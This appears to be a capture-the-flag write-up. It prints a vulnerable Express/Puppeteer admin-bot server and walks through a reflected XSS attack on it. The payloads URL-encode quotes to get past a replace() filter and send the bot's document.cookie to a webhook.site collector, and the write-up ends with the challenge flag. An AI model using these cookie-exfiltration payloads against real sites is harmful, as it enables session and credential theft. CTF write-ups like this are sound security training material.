Attachments:  
 * dist.zip

The dist.zip contains an index.js file with the following code:  
```javascript  
const express = require('express')  
const puppeteer = require('puppeteer');  
const cookieParser = require("cookie-parser");  
const rateLimit = require('express-rate-limit');  
require('dotenv').config();

const app = express()  
const port = process.env.PORT || 3000

const CONFIG = {  
 APPURL: process.env['APPURL'] || `http://127.0.0.1:${port}`,  
 APPFLAG: process.env['APPFLAG'] || "fake{flag}",  
}  
console.table(CONFIG)

const limiter = rateLimit({  
	windowMs: 60 * 1000, // 1 minute  
	limit: 4, // Limit each IP to 4 requests per `window` (here, per minute).  
	standardHeaders: 'draft-7',  
	legacyHeaders: false,  
})

app.use(express.json());  
app.use(express.urlencoded({ extended: true }));  
app.use(cookieParser());  
app.set('views', __dirname + '/views');  
app.use(express.static("./public"));  
app.engine('html', require('ejs').renderFile);  
app.set('view engine', 'ejs');

function sleep(s){  
 return new Promise((resolve)=>setTimeout(resolve, s))  
}

app.get('/', (req, res) => {  
 res.render('index.html');  
})

app.get('/admin/view', (req, res) => {  
 if (req.cookies.flag === CONFIG.APPFLAG) {  
   res.send(req.query.content);  
 }  
 else {  
   res.send('You are not Walter White!');  
 }  
})

app.post('/review', limiter,  async (req, res) => {  
 const initBrowser = puppeteer.launch({  
     executablePath: "/opt/homebrew/bin/chromium",  
     headless: true,  
     args: [  
         '--disable-dev-shm-usage',  
         '--no-sandbox',  
         '--disable-setuid-sandbox',  
         '--disable-gpu',  
         '--no-gpu',  
         '--disable-default-apps',  
         '--disable-translate',  
         '--disable-device-discovery-notifications',  
         '--disable-software-rasterizer',  
         '--disable-xss-auditor'  
     ],  
     ignoreHTTPSErrors: true  
 });  
 const browser = await initBrowser;  
 const context = await browser.createBrowserContext()  
 const content = req.body.content.replace("'", '').replace('"',
'').replace("`", '');  
 const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;  
 try {  
     const page = await context.newPage();  
     await page.setCookie({  
         name: "flag",  
         httpOnly: false,  
         value: CONFIG.APPFLAG,  
         url: CONFIG.APPURL  
     })  
     await page.goto(urlToVisit, {  
         waitUntil: 'networkidle2'  
     });  
     await sleep(1000);  
     // Close  
     await context.close()  
     res.redirect('/')  
 } catch (e) {  
     console.error(e);  
     await context.close();  
     res.redirect('/')  
 }  
})

app.listen(port, () => {  
 console.log(`Purdue winning on port ${port}`)  
})  
```

The app.post('/review', limiter,  async (req, res) function is a Node.js
server-side endpoint that uses Puppeteer to interact with a (server side) web
browser programmatically. It takes a request body, parses its content, and
then visits a specific URL on the application's domain using Puppeteer.

Placing this payload inside of the 'message' field of the page form will lead
to a call to the given webhook from the puppeteer browser:  
```html  
![](https://webhook.site/99853521-2093-4f3e-8f5a-8310bf862879)  
```  
Now we need to get the puppeteer browser to send its cookies as a request
parameter to the webhook url.  
The problem is, that the content is sanitized via  
```javascript  
const content = req.body.content.replace("'", '').replace('"',
'').replace("`", '');  
```  
So we need to find alternatives for the replaced characters. As the whole
content gets passed in a URL parameter, we can make this script run
successfully to call our webhook using URL encoding (' = %27) for the replaced
chars:  
```html  
<script>  
	function setUrl()   
	{  
		e = document.getElementById(%27asd%27);  
		e.src = %27%27.concat(%27https://webhook.site/99853521-2093-4f3e-8f5a-8310bf862879?cookies=%27,%27asdf2%27);  
	}  
</script>  
![](%27https://b01lersc.tf/assets/logo.svg%27)  
```  
Now we just need to extract the sites 'flag' cookie:

```html  
<script>  
	function setUrl()   
	{  
		e = document.getElementById(%27asd%27);  
		e.src = %27%27.concat(%27https://webhook.site/99853521-2093-4f3e-8f5a-8310bf862879?cookies=%27,document.cookie);  
	}  
</script>  
![](%27https://b01lersc.tf/assets/logo.svg%27)  
```  
The flag is returned in the cookie URL parameter:  
```  
bctf{wow_you_can_get_a_free_ad_now!}  
```